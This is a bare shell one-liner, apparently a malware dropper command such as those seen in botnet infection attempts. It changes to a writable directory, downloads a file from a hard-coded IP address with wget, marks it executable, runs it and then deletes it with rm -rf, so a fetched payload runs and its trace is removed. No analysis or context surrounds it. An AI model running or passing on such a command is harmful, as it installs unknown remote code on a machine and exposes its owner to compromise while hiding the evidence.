cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.236.160.204/' '; chmod +x ' '; ./' '; rm -rf ' '
